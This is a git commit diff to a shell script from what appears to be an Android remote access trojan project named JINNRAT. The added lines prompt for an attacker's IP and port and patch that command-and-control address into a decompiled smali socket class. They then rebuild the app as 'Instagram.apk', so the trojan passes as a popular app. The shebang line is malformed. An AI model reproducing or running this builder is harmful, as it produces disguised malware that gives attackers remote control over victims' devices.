5aad8b08d8e51be25752b905f6e5c8203d4adbea
•JINN• <95747858+alvinbaby@users.noreply.github.com>
2022-07-08 21:52:28 +0530

    Update a6d05-6868-65fd5.sh

--- server/assets/webpublic/client_downloads/a6d05-6868-65fd5.sh
+++ server/assets/webpublic/client_downloads/a6d05-6868-65fd5.sh
@@ -1,4 +1,18 @@
-#!/usr/bin/env sh
+#!/#!/usr/bin/env sh
+
+smaliFile="smali_classes4/com/Liz0rd/lizrat/IOSocket.smali"
+
+if [ -d $HOME/JINNRAT ]; then
+
+    appPath="$HOME/JINNRAT/server/app/decompiled"
+fi
+
+read -p "✅ 🇮🇵/🇺🇷🇱/🇭🇴🇸🇹 : " host
+read -p "✅ 🇵🇴🇷🇹 : " port
+
+sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
+
+apkmod -R -i "$appPath" -o ~/JINNRAT/app/Instagram.apk sh
 
 smaliFile="smali/com/Liz0rd/lizrat/IOSocket.smali"
 
